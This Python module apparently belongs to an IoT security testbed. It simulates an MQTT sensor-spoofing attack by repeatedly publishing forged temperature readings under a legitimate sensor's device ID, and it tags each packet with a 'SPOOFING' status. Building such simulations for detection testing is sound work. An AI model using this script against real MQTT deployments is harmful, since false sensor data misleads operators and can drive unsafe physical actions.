"""
Spoofing Attack

Purpose:
    Simulates a fake sensor impersonating a legitimate device.
"""

from backend.attacks.attack_config import (
    TEMPERATURE_TOPIC,
    SPOOFING_ATTACK_CLIENT,
    SPOOFING_PACKET_INTERVAL,
    SPOOFING_ATTACK_DURATION,
)

from backend.attacks.base_attack import BaseAttack


class SpoofingAttack(BaseAttack):
    """MQTT Sensor Spoofing Attack."""

    def __init__(self):
        super().__init__(
            attack_name="Spoofing Attack",
            client_id=SPOOFING_ATTACK_CLIENT,
            interval=SPOOFING_PACKET_INTERVAL,
            duration=SPOOFING_ATTACK_DURATION,
        )

        self.packet_count = 0

    def execute(self):
        """Publish a spoofed sensor packet."""

        self.packet_count += 1

        payload = {
            "device_id": "temperature_sensor_01",
            "sensor_type": "temperature",
            "value": 85.0,
            "unit": "°C",
            "status": "SPOOFING",
        }

        self.publisher.publish(
            TEMPERATURE_TOPIC,
            payload,
        )

        self.logger.info(
            f"Spoofed Packet #{self.packet_count} → {TEMPERATURE_TOPIC}"
        )


if __name__ == "__main__":
    attack = SpoofingAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()